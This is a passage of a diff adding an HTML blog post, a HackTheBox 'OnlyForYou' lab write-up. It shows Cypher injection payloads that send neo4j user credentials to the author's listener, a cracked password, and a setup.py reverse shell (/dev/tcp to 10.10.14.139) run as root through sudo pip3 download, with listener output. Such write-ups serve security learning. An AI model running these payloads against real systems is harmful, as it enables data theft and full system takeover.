+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="208"
+		data-flex-basis="499px"
+	
+></p>
+<p>It mentions the database is migrated over to neo4j,  and selecting the employees tab on the left-hand side immediately shows us how we might interact with the database.</p>
+<p><img src="/post/hackthebox-onlyforyou/Images/Search1.png"
+	width="1288"
+	height="549"
+	srcset="/post/hackthebox-onlyforyou/Images/Search1_hu5b406ade0ccbfae304f8a816bb218b57_89492_480x0_resize_box_3.png 480w, /post/hackthebox-onlyforyou/Images/Search1_hu5b406ade0ccbfae304f8a816bb218b57_89492_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="234"
+		data-flex-basis="563px"
+	
+></p>
+<p>It looks like we can dump the entire table with a blank search, but how might we exploit this kind of database?</p>
+<h3 id="cypher-injection-vulnerability-in-neo4j">Cypher Injection vulnerability in neo4j</h3>
+<p>Fortunately, <a class="link" href="https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j"  target="_blank" rel="noopener"
+    >hacktricks has a page dedicated to cypher injection</a>.</p>
+<p>Probing which injectable query is being used was quite a pain, as it will often result in 500 error or no change. Eventually, however, I found a payload in which the server will send database information to my own listener:
+search payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM &#39;http://10.10.14.139/?version=&#39; + version + &#39;&amp;name=&#39; + name + &#39;&amp;edition=&#39; + edition as l RETURN 0 as _0 //
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On my listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python -m http.server 80
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</span></span><span class="line"><span class="cl">10.10.11.210 - - [22/Apr/2023 21:44:31] code 400, message Bad request syntax (&#39;GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1&#39;)
+</span></span><span class="line"><span class="cl">10.10.11.210 - - [22/Apr/2023 21:44:31] &#34;GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1&#34; 400 -
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This current payload only produces the neo4j version, name, and edition. However, it we&rsquo;re looking for a way to dump all information on the database. Now that the injection is established, surely it won&rsquo;t be too hard?
+Eventually I learn to dump databases:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; OR 1=1 WITH 1 as a CALL db.labels() YIELD label AS d LOAD CSV FROM &#39;http://10.10.14.139/?d=&#39; + d AS y RETURN y//
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python -m http.server 80
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</span></span><span class="line"><span class="cl">10.10.11.210 - - [22/Apr/2023 23:48:22] &#34;GET /?d=user HTTP/1.1&#34; 200 -
+</span></span><span class="line"><span class="cl">10.10.11.210 - - [22/Apr/2023 23:48:22] &#34;GET /?d=employee HTTP/1.1&#34; 200 -
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Employee is likely the data we are already viewing, and user likely has the login credentials we are seeking. After trying once again for several hours, I finally generate a payload that can dump the contents:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM &#39;http://10.10.14.139/?&#39; + p +&#39;=&#39;+toString(f[p]) as l RETURN 0 as _0 //
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python -m http.server 80
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</span></span><span class="line"><span class="cl">10.10.11.210 - - [23/Apr/2023 14:20:22] &#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&#34; 200 -
+</span></span><span class="line"><span class="cl">10.10.11.210 - - [23/Apr/2023 14:20:22] &#34;GET /?username=admin HTTP/1.1&#34; 200 -
+</span></span><span class="line"><span class="cl">10.10.11.210 - - [23/Apr/2023 14:20:23] &#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&#34; 200 -
+</span></span><span class="line"><span class="cl">10.10.11.210 - - [23/Apr/2023 14:20:23] &#34;GET /?username=john HTTP/1.1&#34; 200 -
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>we know one pair of creds as admin:admin, but the other one is interesting:
+<code>john:a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6</code></p>
+<p>Fortunately this cracks in a popular online rainbow table:</p>
+<p><img src="/post/hackthebox-onlyforyou/Images/crackstation.png"
+	width="1546"
+	height="513"
+	srcset="/post/hackthebox-onlyforyou/Images/crackstation_hu6210423fd841b4710e8f83a2ba8dac75_94469_480x0_resize_box_3.png 480w, /post/hackthebox-onlyforyou/Images/crackstation_hu6210423fd841b4710e8f83a2ba8dac75_94469_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Cracked with crackstation.net"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="301"
+		data-flex-basis="723px"
+	
+></p>
+<p>We now have credentials as <code>john:ThisIs4You</code>.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="enumerating-as-user-john">Enumerating as user john</h3>
+<p>Now wish <code>ssh</code>, we can tunnel without the need for chisel</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ssh -D 1080 john@only4you.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can return back to the gog server, and possibly login with john</p>
+<p><img src="/post/hackthebox-onlyforyou/Images/Test.png"
+	width="1076"
+	height="619"
+	srcset="/post/hackthebox-onlyforyou/Images/Test_hu8da40a312692271d3d956874099dd638_45947_480x0_resize_box_3.png 480w, /post/hackthebox-onlyforyou/Images/Test_hu8da40a312692271d3d956874099dd638_45947_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="173"
+		data-flex-basis="417px"
+	
+></p>
+<p>There is 1 repository as Test, but there doesn&rsquo;t seem to be anything interesting here.</p>
+<p>Checking <code>sudo</code> privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">john@only4you:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for john on only4you:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User john may run the following commands on only4you:
+</span></span><span class="line"><span class="cl">    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="abusing-pip3-download-to-execute-commands-as-root">Abusing pip3 download to execute commands as root</h3>
+<p>It looks like we can use <code>pip3</code> to download any repository zip as root. When researching what can be done about this, I find <a class="link" href="https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/"  target="_blank" rel="noopener"
+    >this article, Malicious Python Packages and Code Execution via pip download</a>. It seems that when pip is downloading/installing, <code>setup.py</code> is executed and in our case, will be done so as root. This allows us to supply malicious code in <code>setup.py</code>, and we can perform privilege escalation.</p>
+<p>Zipping the repo seems rather complicated, so I just cloned the repo, edited my paylod into setup.py, and followed instructions to comress/build:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ git clone https://github.com/wunderwuzzi23/this_is_fine_wuzzi/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>changes to setup.py:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from setuptools import setup, find_packages
+</span></span><span class="line"><span class="cl">from setuptools.command.install import install
+</span></span><span class="line"><span class="cl">from setuptools.command.egg_info import egg_info
+</span></span><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def RunCommand():
+</span></span><span class="line"><span class="cl">    os.system(&#34;bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.139/8888 0&gt;&amp;1&#39;&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class RunEggInfoCommand(egg_info):
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Building:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python -m build
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">adding &#39;this_is_fine_wuzzi-0.0.1.dist-info/LICENSE&#39;
+</span></span><span class="line"><span class="cl">adding &#39;this_is_fine_wuzzi-0.0.1.dist-info/METADATA&#39;
+</span></span><span class="line"><span class="cl">adding &#39;this_is_fine_wuzzi-0.0.1.dist-info/WHEEL&#39;
+</span></span><span class="line"><span class="cl">adding &#39;this_is_fine_wuzzi-0.0.1.dist-info/top_level.txt&#39;
+</span></span><span class="line"><span class="cl">adding &#39;this_is_fine_wuzzi-0.0.1.dist-info/RECORD&#39;
+</span></span><span class="line"><span class="cl">removing build/bdist.linux-x86_64/wheel
+</span></span><span class="line"><span class="cl">Successfully built this_is_fine_wuzzi-0.0.1.tar.gz and this_is_fine_wuzzi-0.0.1-py3-none-any.whl
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This produces a whl and a .tar.gz file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cd dist              
+</span></span><span class="line"><span class="cl">$ ls
+</span></span><span class="line"><span class="cl">this_is_fine_wuzzi-0.0.1-py3-none-any.whl  this_is_fine_wuzzi-0.0.1.tar.gz
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Uploading file:</p>
+<p><img src="/post/hackthebox-onlyforyou/Images/upload.png"
+	width="1043"
+	height="775"
+	srcset="/post/hackthebox-onlyforyou/Images/upload_hu42112325f46bd0fe481d404b3fbff7cc_46514_480x0_resize_box_3.png 480w, /post/hackthebox-onlyforyou/Images/upload_hu42112325f46bd0fe481d404b3fbff7cc_46514_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="134"
+		data-flex-basis="322px"
+	
+></p>
+<p>Running the sudo command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">john@only4you:~$ sudo /usr/bin/pip3 download http\://127.0.0.1\:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
+</span></span><span class="line"><span class="cl">Collecting http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
+</span></span><span class="line"><span class="cl">  ERROR: HTTP error 404 while getting http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
+</span></span><span class="line"><span class="cl">  ERROR: Could not install requirement http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz because of error 404 Client Error: Not Found for url: http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz                                                                                                          
+</span></span><span class="line"><span class="cl">ERROR: Could not install requirement http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz because of HTTP error 404 Client Error: Not Found for url: http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz for URL http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It appears that the download fails, because the url is unreachable? After exploring a little more, I remember that the repo was only visible after logging in. In order for this url to work (without cookies/login credentials), then it needs to be public:</p>
+<p><img src="/post/hackthebox-onlyforyou/Images/Public.png"
+	width="783"
+	height="726"
+	srcset="/post/hackthebox-onlyforyou/Images/Public_huc7627f7c28ef97d757317f412256e7df_43747_480x0_resize_box_3.png 480w, /post/hackthebox-onlyforyou/Images/Public_huc7627f7c28ef97d757317f412256e7df_43747_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Switching repo to public"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="107"
+		data-flex-basis="258px"
+	
+></p>
+<p>Now, executing the sudo command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">john@only4you:~$ sudo /usr/bin/pip3 download http\://127.0.0.1\:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
+</span></span><span class="line"><span class="cl">Collecting http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
+</span></span><span class="line"><span class="cl">  Downloading http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
+</span></span><span class="line"><span class="cl">     - 2.8 kB 10.1 MB/s
+</span></span><span class="line"><span class="cl">  Saved ./this_is_fine_wuzzi-0.0.1.tar.gz
+</span></span><span class="line"><span class="cl">Successfully downloaded this-is-fine-wuzzi
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Meanwhile on my listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ nc -nvlp 8888           
+</span></span><span class="line"><span class="cl">listening on [any] 8888 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.139] from (UNKNOWN) [10.10.11.210] 34386
+</span></span><span class="line"><span class="cl">root@only4you:/tmp/pip-req-build-3yl3w6ls# whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">root@only4you:/tmp/pip-req-build-3yl3w6ls#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The exploit worked, and now we have full access as root.</p>
+<h2 id="reflection">Reflection</h2>
+<p>This box felt particularly well-earned as the Cypher Injection segment ended up being a nightmare. An entirely unfamiliar database language, coupled with every injection attempt respond with <code>error 500</code>. It turned into a great learning experience, with a lot of skills/techniques challenged throughout the box. As usual, I found Privilege escalation, the abuse of <code>sudo pip3 download</code>, to be a really cool highlight of a method I had not known.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/python/">Python</a>
+        
+            <a href="/tags/arbitrary-file-read/">Arbitrary File Read</a>
+        
+            <a href="/tags/command-injection/">Command Injection</a>
+        
+            <a href="/tags/chisel/">Chisel</a>
+        
+            <a href="/tags/port-forwarding/">Port Forwarding</a>
+        
+            <a href="/tags/neo4j/">Neo4j</a>
+        
+            <a href="/tags/cypher-injection/">Cypher Injection</a>
+        
+            <a href="/tags/pip/">pip</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-agile/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-agile/Agile.e64eb2d34a7a6346f24c5fd437dde6f0_hu5e06ffde2f95e1276a1510a6a2985d71_363689_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Agile"
+                        
+                        data-hash="md5-5k6y00p6Y0byTF/UN93m8A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Agile</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-mailroom/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-mailroom/Mailroom.0954462925d337843baeedfaf8bb9ccf_hu83fa4872cdc769af1a6c4264f0edd42d_354362_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Mailroom"
+                        
+                        data-hash="md5-CVRGKSXTN4Q7ru36&#43;Luczw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Mailroom</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-socket/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-socket/Socket.b5f448cb0b8111b44376a9763dfc88f8_hu849eb59558b706146747b24028bb82f3_354031_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Socket"
+                        
+                        data-hash="md5-tfRIywuBEbRDdql2PfyI&#43;A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Socket</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-inject/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-inject/Inject.9f9716c1200516310e6e4cd98e20c139_hu12ac3957f7a126ac06ec9338f7d84355_333068_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Inject"
+                        
+                        data-hash="md5-n5cWwSAFFjEObkzZjiDBOQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Inject</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-monitorstwo/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-monitorstwo/MonitorsTwo.7bcf0cb787855b0537bc7c5327c0f7dd_hu024166abe3ac2c9d2978be07dc4c2b69_418807_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - MonitorsTwo"
+                        
+                        data-hash="md5-e88Mt4eFWwU3vHxTJ8D33Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - MonitorsTwo</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2023 Spencer&#39;s Blog
+    </section>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#exploring-subdomains">Exploring subdomains</a></li>
+        <li><a href="#analyzing-beta-site-source-code">Analyzing beta site source code</a></li>
+        <li><a href="#using-arbitrary-file-read-to-retrieve-main-site-source-code">Using Arbitrary File Read to retrieve main site source code</a></li>
+      </ol>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ol>
+        <li><a href="#command-injection-vulnerability-in-message-form">Command Injection vulnerability in message form</a></li>
+        <li><a href="#enumerating-the-system-as-www-data">Enumerating the system as www-data</a></li>
+        <li><a href="#cypher-injection-vulnerability-in-neo4j">Cypher Injection vulnerability in neo4j</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#enumerating-as-user-john">Enumerating as user john</a></li>
+        <li><a href="#abusing-pip3-download-to-execute-commands-as-root">Abusing pip3 download to execute commands as root</a></li>
+      </ol>
+    </li>
+    <li><a href="#reflection">Reflection</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+
+    </body>
+</html>
